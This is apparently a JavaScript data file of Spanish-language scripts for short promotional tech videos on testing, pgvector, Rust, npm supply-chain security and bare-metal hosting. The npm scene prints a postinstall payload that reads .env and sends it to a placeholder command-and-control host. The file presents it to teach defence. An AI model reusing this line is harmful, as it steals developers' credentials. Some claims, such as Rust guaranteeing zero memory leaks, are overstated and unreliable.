// Data definitions for Topics 06 to 10 (Zero // AI-slop, Zero SeDev watermarks, Varied Hooks)
module.exports = [
  // ----------------------------------------------------
  // TEMA 06: VERIFICACIÓN VS VIBE CODING
  // ----------------------------------------------------
  {
    slug: '06_verificacion_vs_vibe_coding',
    category: 'CALIDAD DE SOFTWARE & TESTING',
    ctaType: 'calidad_software',
    varA: {
      title: 'Mutation & Property-Based Testing: Verificando código de IA',
      tone: 'Metodológico, riguroso, matemáticas y análisis de mutación',
      scenes: [
        {
          id: 'mutation_terminal_hook',
          type: 'code_terminal',
          duration: 6.5,
          voiceover: 'Generar código con IA es instantáneo; verificar que no destruya producción a las tres de la madrugada es el verdadero reto de ingeniería.',
          visual_cue: 'Apertura directa con terminal ejecutando mutaciones de prueba sobre el código',
          props: {
            header: 'MUTATION TESTING EN CI',
            title: 'STRYKER MUTATION ENGINE',
            filename: 'tests/mutation.log',
            codeLines: [
              'stryker run --concurrency=8',
              'Inyectando mutación: reemplazado ">=" por ">" en auth.ts:42',
              'Ejecutando suite de pruebas contra mutante #104...',
              'FALLO: El mutante sobrevivió sin ser detectado',
              'Score de mutación: 68% · Requiere assertions más estrictos'
            ],
            cursorLine: 4
          }
        },
        {
          id: 'property_testing',
          type: 'tradeoff_matrix',
          duration: 6.0,
          voiceover: 'En vez de probar tres casos aislados, los tests basados en propiedades generan diez mil combinaciones de datos aleatorios para romper tu lógica.',
          visual_cue: 'Matriz comparando Unit Tests manuales vs Property-Based Testing',
          props: {
            header: 'MÉTODOS DE COMPROBACIÓN',
            title: 'UNIT TESTS VS PROPERTY TESTING',
            colA: 'PROPERTY-BASED TESTING',
            colB: 'TESTS MANUALES BÁSICOS',
            rows: [
              { dim: 'Entradas probadas', a: '10.000 generadas por run', b: '3 o 4 ejemplos fijos', aGood: true },
              { dim: 'Casos límite ocultos', a: 'Detecta desbordamientos', b: 'Ignora casos extremos', aGood: true },
              { dim: 'Resistencia a mutantes', a: 'Alta cobertura real', b: 'Falso 100% de coverage', aGood: true }
            ]
          }
        },
        {
          id: 'cta_testing',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Audito suites de prueba y diseño pipelines de verificación determinista para equipos de desarrollo. Link en mi perfil para agendar una sesión.',
          visual_cue: 'Cierre con auditoría de calidad de software',
          props: {
            header: 'AUDITORÍA DE CALIDAD Y TESTING',
            title: 'BLINDA TU SOFTWARE EN PRODUCCIÓN',
            cta: {
              badge: 'AUDITORÍA DE CALIDAD (Link en bio)',
              text: '¿Dudas de la fiabilidad de tu código autogenerado? Link en bio para auditar tus suites de prueba.'
            }
          }
        }
      ]
    },
    varB: {
      title: '"Vibe Coding" es una bomba de tiempo: Por qué la deuda explotará',
      tone: 'Ácido, realista, alertando del peligro de aceptar código sin entenderlo',
      scenes: [
        {
          id: 'impact_hook_vibe',
          type: 'kinetic_hook',
          duration: 4.5,
          voiceover: 'Aceptar sugerencias de IA sin entender cómo funcionan no es programar rápido: es firmar una hipoteca de deuda técnica que vas a pagar muy cara.',
          visual_cue: 'Tipografía de impacto gigante sin iconos genéricos',
          props: {
            layout: 'impact',
            badge: 'DEBATES DE LA INDUSTRIA',
            lines: [
              { text: '"VIBE CODING" ES UNA', color: '#ffffff' },
              { text: 'BOMBA DE TIEMPO', color: '#ef4444' }
            ],
            subtitle: 'Deuda técnica acumulada a velocidad récord'
          }
        },
        {
          id: 'split_vibe_vs_eng',
          type: 'terminal_split',
          duration: 6.0,
          voiceover: 'El código barato de escribir es carísimo de mantener si nadie en el equipo sabe cómo depurarlo cuando colapse el servicio.',
          visual_cue: 'Doble terminal: Vibe Coder improvisando vs Ingeniero aplicando verificación',
          props: {
            header: 'EL COSTE OCULTO',
            title: 'ILUSIÓN DE VELOCIDAD VS MANTENIMIENTO',
            termA: {
              title: 'EQUIPO "VIBE CODING"',
              color: '#ef4444',
              cmd: 'git commit -m "parece que funciona en local"',
              status: '32 dependencias fantasma añadidas',
              time: 'Caída p99',
              lines: [
                'Fugas de memoria silentes en event listeners',
                'Nadie entiende el archivo de 1,200 líneas autogenerado',
                'Tiempo de resolución de incidencias: 3 días'
              ]
            },
            termB: {
              title: 'INGENIERÍA RIGUROSA',
              color: '#10b981',
              cmd: 'cargo test --all-features && cargo clippy',
              status: 'Cero warnings, tipos estrictos y límites claros',
              time: 'Estable 24/7',
              lines: [
                'Invariantes de negocio validados en tipos estáticos',
                'Arquitectura modular documentada y legible',
                'Tiempo medio de recuperación: 5 minutos'
              ]
            }
          }
        },
        {
          id: 'cta_testing_b',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Ayudo a empresas a sanear bases de código y frenar la deuda técnica generada por IA. Contáctame en el enlace de mi perfil.',
          visual_cue: 'Cierre con auditoría de deuda técnica',
          props: {
            header: 'AUDITORÍA DE DEUDA TÉCNICA',
            title: 'RECUPERA EL CONTROL DE TU CODEBASE',
            cta: {
              badge: 'AUDITORÍA DE ARQUITECTURA (Contacto en bio)',
              text: '¿Tu codebase se volvió inmanejable? Hablemos en el link de la biografía.'
            }
          }
        }
      ]
    }
  },

  // ----------------------------------------------------
  // TEMA 07: PGVECTOR VS VECTOR DB
  // ----------------------------------------------------
  {
    slug: '07_pgvector_vs_vectordb',
    category: 'BASES DE DATOS & IA',
    ctaType: 'database',
    varA: {
      title: 'Algoritmo HNSW en memoria: Grafos vectoriales en PostgreSQL',
      tone: 'Ciencia de datos, algoritmos de grafos, rendimiento de memoria',
      scenes: [
        {
          id: 'hnsw_tree_hook',
          type: 'tree_hierarchy',
          duration: 6.5,
          voiceover: '¿Cómo busca PostgreSQL entre un millón de vectores de IA en menos de cinco milisegundos? Con grafos HNSW navegables.',
          visual_cue: 'Apertura directa con jerarquía de árbol navegable mostrando saltos hasta el vector',
          props: {
            header: 'ALGORITMO HNSW',
            title: 'HIERARCHICAL NAVIGABLE SMALL WORLD',
            complexity: 'COMPLEJIDAD: O(log N) · DISTANCIA COSENO',
            nodes: [
              { id: 'top', label: 'CAPA 2: SALTOS LARGOS', x: 480, y: 240, level: 0 },
              { id: 'mid1', label: 'CAPA 1: CLUSTER A', x: 260, y: 520, level: 1, parent: 'top' },
              { id: 'mid2', label: 'CAPA 1: CLUSTER B', x: 700, y: 520, level: 1, parent: 'top' },
              { id: 'leaf', label: 'TARGET: SIMILARITY 0.94', x: 260, y: 840, level: 2, parent: 'mid1', target: true }
            ],
            footerBadge: 'RENDIMIENTO HNSW EN POSTGRES',
            footerText: 'Recorre un grafo multidimensional en RAM sin escanear la tabla entera.',
            footerSubtext: 'Búsqueda por similitud semántica en menos de 4 milisegundos.'
          }
        },
        {
          id: 'pg_sql',
          type: 'code_terminal',
          duration: 6.0,
          voiceover: 'Lo mejor es que puedes combinar búsqueda de similitud semántica con filtros relacionales clásicos en una sola consulta SQL transaccional.',
          visual_cue: 'Terminal ejecutando query combinada en PostgreSQL con pgvector',
          props: {
            header: 'CONSULTA HÍBRIDA EN POSTGRES',
            title: 'FILTRO RELACIONAL + VECTOR SEARCH',
            filename: 'db/hybrid_search.sql',
            codeLines: [
              'SELECT id, title, (embedding <=> $1) as distance',
              'FROM articles',
              'WHERE user_id = 42 AND published_at > NOW() - INTERVAL "30 days"',
              'ORDER BY embedding <=> $1',
              'LIMIT 5;',
              '-- Ejecución: 3.8ms usando índice HNSW'
            ],
            cursorLine: 5
          }
        },
        {
          id: 'cta_pgvector',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Si quieres implementar búsqueda semántica o auditar tu arquitectura de datos para IA sin sobrecostes innecesarios, link en mi perfil.',
          visual_cue: 'Cierre con llamado a auditoría de bases de datos',
          props: {
            header: 'AUDITORÍA DE BASES DE DATOS & IA',
            title: 'OPTIMIZA TUS PIPELINES DE EMBEDDINGS',
            cta: {
              badge: 'AUDITORÍA DE DATOS (Link en bio)',
              text: '¿Búsquedas vectoriales lentas o caras? Hablemos en el enlace de mi perfil.'
            }
          }
        }
      ]
    },
    varB: {
      title: 'No necesitas Pinecone: Todo tu stack de IA cabe en Postgres',
      tone: 'Pragmático, contra el despilfarro de bases vectoriales dedicadas',
      scenes: [
        {
          id: 'sync_split_hook',
          type: 'terminal_split',
          duration: 6.5,
          voiceover: 'Te vendieron que necesitas Pinecone para hacer IA. Mantener dos bases de datos te obliga a sincronizar IDs y transacciones que siempre fallan.',
          visual_cue: 'Apertura directa con terminal comparando sincronización dual problemática vs base única',
          props: {
            header: 'COMPLEJIDAD OPERATIVA',
            title: 'DOS BASES DE DATOS VS UNA SOLA',
            termA: {
              title: 'POSTGRES + PINECONE EXTERNO',
              color: '#ef4444',
              cmd: 'sync_worker.py (Sincronizando IDs)',
              status: 'Inconsistencias cuando falla la red',
              time: '$340/mes extra',
              lines: [
                'Si el delete falla en Pinecone, quedan embeddings huérfanos',
                'Doble factura: Base de datos + Proveedor vectorial',
                'Latencia añadida entre dos nubes distintas'
              ]
            },
            termB: {
              title: 'POSTGRESQL NATIVO (PGVECTOR)',
              color: '#10b981',
              cmd: 'CREATE INDEX USING hnsw (embedding vector_cosine_ops)',
              status: 'Transacciones ACID nativas',
              time: '$0 extra',
              lines: [
                'Un solo respaldo con pg_dump tradicional',
                'Join directo entre tablas relacionales y embeddings',
                'Cero sincronizaciones en segundo plano'
              ]
            }
          }
        },
        {
          id: 'cta_pgvector_b',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Audito la capa de persistencia de tu producto para consolidar tu stack y reducir costes operativos. Agenda tu sesión técnica en el link de la bio.',
          visual_cue: 'Cierre con auditoría de base de datos',
          props: {
            header: 'AUDITORÍA DE BASES DE DATOS',
            title: 'SIMPLIFICA TU CAPA DE PERSISTENCIA',
            cta: {
              badge: 'AUDITORÍA DE DATOS (Link en bio)',
              text: 'Consolida tus bases de datos y ahorra costes. Link en mi perfil para agendar tu auditoría.'
            }
          }
        }
      ]
    }
  },

  // ----------------------------------------------------
  // TEMA 08: RUST SISTEMAS CRÍTICOS
  // ----------------------------------------------------
  {
    slug: '08_rust_sistemas_criticos',
    category: 'LENGUAJES DE SISTEMAS & RENDIMIENTO',
    ctaType: 'contratacion_senior',
    varA: {
      title: 'El Borrow Checker de Rust: Cero fugas de memoria sin GC',
      tone: 'Ciencia de la computación, seguridad de memoria en tiempo de compilación',
      scenes: [
        {
          id: 'memory_borrow_hook',
          type: 'memory_layout',
          duration: 6.5,
          voiceover: '¿Cómo garantizar que un programa nunca tendrá fugas de memoria sin usar un recolector de basura? El Borrow Checker de Rust libera la memoria de forma estática.',
          visual_cue: 'Apertura directa con layout de memoria Stack vs Heap y liberación sin recolector',
          props: {
            header: 'GESTIÓN ESTÁTICA DE MEMORIA',
            title: 'PROPIEDAD Y PRÉSTAMOS (OWNERSHIP)',
            items: [
              { name: 'STACK FRAME ACTIVO', addr: '0x7fff001', value: 'Buffer asignado y dueño único', color: '#10b981' },
              { name: 'DROP AUTOMÁTICO EN COMPILACIÓN', addr: '0x7fff002', value: 'Cero pausas de Garbage Collector (0ns)', color: '#38bdf8' }
            ]
          }
        },
        {
          id: 'rust_code',
          type: 'code_terminal',
          duration: 6.0,
          voiceover: 'Si intentas compartir un puntero mutable entre dos hilos a la vez, el compilador se niega a generar el binario. Cero condiciones de carrera en producción.',
          visual_cue: 'Terminal mostrando error del borrow checker previniendo una condición de carrera',
          props: {
            header: 'PREVENCIÓN EN COMPILACIÓN',
            title: 'EL COMPILADOR DEFIENDE TU SISTEMA',
            filename: 'src/concurrency.rs',
            codeLines: [
              'fn process(shared: &mut Data) {',
              '  thread::spawn(move || {',
              '    shared.mutate(); // ERROR E0502: Cannot borrow as mutable',
              '  });',
              '  shared.read();',
              '}'
            ],
            cursorLine: 4
          }
        },
        {
          id: 'cta_rust',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Diseño servicios backend de alto rendimiento y baja latencia en Rust y Go. Si buscas un desarrollador senior para liderar tu sistema, link en mi perfil.',
          visual_cue: 'Cierre con contratación senior backend',
          props: {
            header: 'CONTRATACIÓN SENIOR / STAFF ENGINEER',
            title: 'DESARROLLO DE SISTEMAS DE ALTA CONCURRENCIA',
            cta: {
              badge: 'STAFF BACKEND DEVELOPER (Link en bio)',
              text: '¿Necesitas desarrollo en Rust o Go para sistemas críticos? Contáctame en el link de la bio.'
            }
          }
        }
      ]
    },
    varB: {
      title: 'Por qué Discord y Cloudflare mataron Go y adoptaron Rust',
      tone: 'Caso de estudio real de industria, analizando p99 y recolector de basura',
      scenes: [
        {
          id: 'metric_spike_hook',
          type: 'metrics_comparison',
          duration: 6.5,
          voiceover: 'Discord tenía millones de usuarios y su servicio en Go se congelaba cada dos minutos por culpa del Garbage Collector. Reescribir en Rust eliminó los picos de latencia.',
          visual_cue: 'Apertura directa con comparativa gráfica de p99 latency con Garbage Collection vs Rust',
          props: {
            header: 'MÉTRICAS DE RENDIMIENTO REAL',
            metricA: { label: 'GO RUNTIME (GC SPIKES)', value: '180ms p99', sub: 'Picos cada 2 minutos por barrido de memoria', color: '#ef4444' },
            metricB: { label: 'RUST (DETERMINISTIC)', value: '0.8ms p99', sub: 'Línea completamente plana las 24 horas', color: '#10b981' }
          }
        },
        {
          id: 'cta_rust_b',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Construyo software de alto rendimiento y arquitectura sin picos de latencia. Si buscas un lead engineer para tu infraestructura, link en mi biografía.',
          visual_cue: 'Cierre con contratación senior',
          props: {
            header: 'CONTRATACIÓN SENIOR BACKEND',
            title: 'SISTEMAS DE BAJA LATENCIA Y ALTO RENDIMIENTO',
            cta: {
              badge: 'LEAD ENGINEER (Contacto en bio)',
              text: 'Desarrollo de servicios backend de misión crítica. Hablemos en el enlace de mi perfil.'
            }
          }
        }
      ]
    }
  },

  // ----------------------------------------------------
  // TEMA 09: SEGURIDAD SUPPLY CHAIN
  // ----------------------------------------------------
  {
    slug: '09_seguridad_supply_chain',
    category: 'CIBERSEGURIDAD & SUPPLY CHAIN',
    ctaType: 'seguridad_infra',
    varA: {
      title: 'Anatomía de un malware en NPM: Robo de .env en scripts postinstall',
      tone: 'Seguridad ofensiva, análisis forense de paquetes, código malicioso',
      scenes: [
        {
          id: 'postinstall_code_hook',
          type: 'code_terminal',
          duration: 6.5,
          voiceover: 'Ejecutar npm install puede darle acceso total a tus claves privadas a un atacante. Así roba un script postinstall tus variables de entorno.',
          visual_cue: 'Apertura directa con terminal mostrando el payload malicioso oculto en package.json',
          props: {
            header: 'PAYLOAD DEL ATACANTE',
            title: 'SCRIPT POSTINSTALL OFUSCADO',
            filename: 'node_modules/fake-lib/package.json',
            codeLines: [
              '"scripts": {',
              '  "postinstall": "node -e \\"const fs=require(\'fs\'),https=require(\'https\');',
              '    const env = fs.readFileSync(\'.env\', \'utf8\');',
              '    https.get(\'https://c2-server.com/leak?d=\' + Buffer.from(env).toString(\'base64\'));\\""',
              '}',
              '# Las claves de AWS, Stripe y bases de datos quedan expuestas'
            ],
            cursorLine: 4
          }
        },
        {
          id: 'leak_pipe',
          type: 'network_pipeline',
          duration: 6.0,
          voiceover: 'El desarrollador ni siquiera se da cuenta porque el comando npm install termina exitosamente mientras sus credenciales viajan por la red.',
          visual_cue: 'Pipeline visual mostrando la exfiltración silenciosa hacia el servidor de comando y control',
          props: {
            header: 'EXFILTRACIÓN SILENCIOSA',
            title: 'FILTRACIÓN DE CLAVES .ENV',
            subtitle: 'TRÁFICO DE SALIDA SIN BARRERAS DE RED',
            stages: [
              { id: 'dev', label: 'TERMINAL LOCAL', sub: 'npm install ejecutado con permisos completos', y: 220, color: '#ef4444', metric: 'Comprometido' },
              { id: 'network', label: 'EXFILTRACIÓN HTTPS', sub: 'Envío de payload base64 en puerto 443', y: 520, color: '#fbbf24', metric: 'Sin bloqueo' },
              { id: 'c2', label: 'SERVIDOR DEL ATACANTE', sub: 'Extracción de AWS_SECRET_ACCESS_KEY', y: 820, color: '#a855f7', metric: 'Claves robadas' }
            ]
          }
        },
        {
          id: 'cta_security',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Audito la seguridad de dependencias y diseño pipelines Zero-Trust para empresas que quieren blindar su código. Link en mi biografía.',
          visual_cue: 'Cierre con auditoría de seguridad de dependencias',
          props: {
            header: 'AUDITORÍA DE SEGURIDAD',
            title: 'PROTEGE TU CADENA DE SUMINISTRO',
            cta: {
              badge: 'AUDITORÍA DE SEGURIDAD (Link en bio)',
              text: '¿Revisas qué ejecutan tus paquetes de NPM? Link en mi perfil para auditar tu pipeline.'
            }
          }
        }
      ]
    },
    varB: {
      title: 'GitHub desactiva postinstall: Cómo blindar tu pipeline Zero-Trust',
      tone: 'Práctico, defensivo, aplicando políticas seguras en package managers',
      scenes: [
        {
          id: 'zerotrust_hook',
          type: 'kinetic_hook',
          duration: 4.5,
          voiceover: 'GitHub y la industria están desactivando los scripts postinstall por defecto. Es momento de blindar tus dependencias con Zero-Trust.',
          visual_cue: 'Tipografía cinética de impacto para ciberseguridad',
          props: {
            layout: 'impact',
            badge: 'DEFENSA EN CI/CD',
            lines: [
              { text: 'BLINDA TU PIPELINE', color: '#ffffff' },
              { text: 'CON ZERO-TRUST', color: '#10b981' }
            ],
            subtitle: 'Bloqueo estricto de scripts no autorizados'
          }
        },
        {
          id: 'sandbox_terminal',
          type: 'code_terminal',
          duration: 6.0,
          voiceover: 'Con la bandera ignore-scripts y aislación en sandboxes efímeros, neutralizas cualquier ataque antes de que pueda tocar tus archivos locales.',
          visual_cue: 'Terminal configurando npm config set ignore-scripts true',
          props: {
            header: 'CONFIGURACIÓN DEFENSIVA',
            title: 'POLÍTICAS DE INSTALACIÓN SEGURA',
            filename: '.npmrc',
            codeLines: [
              '# Desactiva ejecución arbitraria de scripts en dependencias:',
              'ignore-scripts=true',
              'audit=true',
              'engine-strict=true',
              '# Si un paquete requiere compilar binarios, debe ser autorizado manualmente'
            ],
            cursorLine: 4
          }
        },
        {
          id: 'cta_security_b',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Audito la postura de seguridad de tu infraestructura y configuro entornos blindados contra fugas de datos. Agenda en mi perfil.',
          visual_cue: 'Cierre con auditoría de ciberseguridad',
          props: {
            header: 'AUDITORÍA DE CIBERSEGURIDAD',
            title: 'ZERO-TRUST EN TUS PIPELINES DE DESPLIEGUE',
            cta: {
              badge: 'AUDITORÍA DE SEGURIDAD (Link en perfil)',
              text: 'Protege tus credenciales y entorno productivo. Link directo en mi perfil.'
            }
          }
        }
      ]
    }
  },

  // ----------------------------------------------------
  // TEMA 10: ÉXODO BARE-METAL KAMAL
  // ----------------------------------------------------
  {
    slug: '10_exodo_bare_metal_kamal',
    category: 'INFRAESTRUCTURA & CLOUD COSTS',
    ctaType: 'cloud_costs',
    varA: {
      title: 'Kamal en Producción: Despliegue Zero-Downtime sin Kubernetes',
      tone: 'Ingeniería práctica de operaciones, simplicidad en servidores dedicados',
      scenes: [
        {
          id: 'kamal_flow_hook',
          type: 'architecture_flow',
          duration: 6.5,
          voiceover: '¿Cómo desplegar con cero tiempo de inactividad sin la pesadilla de Kubernetes? Kamal levanta el nuevo contenedor, valida la salud y conmuta el tráfico en milisegundos.',
          visual_cue: 'Apertura directa con arquitectura de conmutación de tráfico con proxy',
          props: {
            header: 'MECANISMO DE DESPLIEGUE',
            title: 'ROLLING RESTART CON TRAEFIK',
            nodes: [
              { id: 'proxy', label: 'TRAEFIK PROXY REVERSE', sublabel: 'Manejo automático de certificados SSL y rutas', color: '#38bdf8', y: 160 },
              { id: 'app_new', label: 'NUEVO CONTENEDOR (V2)', sublabel: 'Health check verificado en localhost:8001', color: '#10b981', y: 520 },
              { id: 'app_old', label: 'CONTENEDOR ANTIGUO (V1)', sublabel: 'Drenado suave de conexiones activas', color: '#71717a', y: 880 }
            ]
          }
        },
        {
          id: 'kamal_deploy',
          type: 'code_terminal',
          duration: 6.0,
          voiceover: 'Todo se configura en un simple archivo YAML. Un comando en tu terminal y tu aplicación queda en producción en tus propios servidores.',
          visual_cue: 'Terminal ejecutando kamal deploy con salida de docker tags',
          props: {
            header: 'CONFIGURACIÓN DECLARATIVA',
            title: 'DEPLOY CON UN SOLO COMANDO',
            filename: 'config/deploy.yml',
            codeLines: [
              'service: api-core',
              'image: registry.gitlab.com/app/api',
              'servers:',
              '  web:',
              '    - 159.69.10.42 # Servidor Hetzner $40/mo',
              'kamal deploy # Completado en 24 segundos con 0s downtime'
            ],
            cursorLine: 5
          }
        },
        {
          id: 'cta_kamal',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Si tu empresa quema dinero en AWS y quieres migrar a una infraestructura simple en servidores dedicados, te asesoro en el proceso. Link en mi perfil.',
          visual_cue: 'Cierre con auditoría y migración cloud',
          props: {
            header: 'MIGRACIÓN & AUDITORÍA CLOUD',
            title: 'REDUCE FACTURA HASTA UN 80%',
            cta: {
              badge: 'AUDITORÍA CLOUD (Link en bio)',
              text: '¿Facturas absurdas en AWS o GCP? Agenda una sesión de migración en mi perfil.'
            }
          }
        }
      ]
    },
    varB: {
      title: 'De $15.000 a $200 al mes: El éxodo de la nube a servidores Hetzner',
      tone: 'Financiero demoledor, destapando el negocio abusivo de la nube pública',
      scenes: [
        {
          id: 'hetzner_split_hook',
          type: 'terminal_split',
          duration: 6.5,
          voiceover: 'Empresas como 37signals abandonaron la nube pública y pasaron de pagar cientos de miles de dólares a una fracción en servidores dedicados.',
          visual_cue: 'Apertura directa con terminal comparando factura mensual de AWS frente a servidor dedicado',
          props: {
            header: 'COMPARATIVA DE HARDWARE Y COSTES',
            title: 'VIRTUALIZACIÓN AWS VS SERVIDOR FÍSICO HETZNER',
            termA: {
              title: 'AWS CLOUD (EKS + RDS + NAT)',
              color: '#ef4444',
              cmd: 'aws billing get-monthly-forecast',
              status: 'Facturación por cada gigabyte transferido',
              time: '$14,800/mes',
              lines: [
                'CPU compartida con vecinos ruidosos',
                'Coste por transferencia de datos: $0.09 por GB',
                'Complejidad: 40 servicios conectados en consola'
              ]
            },
            termB: {
              title: 'HETZNER DEDICATED SERVER',
              color: '#10b981',
              cmd: 'lscpu && free -h',
              status: 'AMD EPYC 32 Cores · 128GB DDR5 RAM · 2x 2TB NVMe',
              time: '$190/mes',
              lines: [
                '100% de la CPU física dedicada a tu app',
                'Tráfico ilimitado a 1 Gbps incluido',
                'Despliegues sencillos con Docker y Kamal'
              ]
            }
          }
        },
        {
          id: 'cta_kamal_b',
          type: 'tradeoff_matrix',
          duration: 5.0,
          voiceover: 'Diseño planes de migración a bare-metal para recortar costes y multiplicar la velocidad de tu backend. Hablemos en el enlace de mi perfil.',
          visual_cue: 'Cierre con auditoría de infraestructura',
          props: {
            header: 'PLAN DE MIGRACIÓN BARE-METAL',
            title: 'AHORRA MILES DE DÓLARES EN INFRAESTRUCTURA',
            cta: {
              badge: 'AUDITORÍA DE COSTES (Link en perfil)',
              text: '¿Listo para salir de la trampa de costes de la nube? Link en mi perfil para agendar tu plan.'
            }
          }
        }
      ]
    }
  }
];
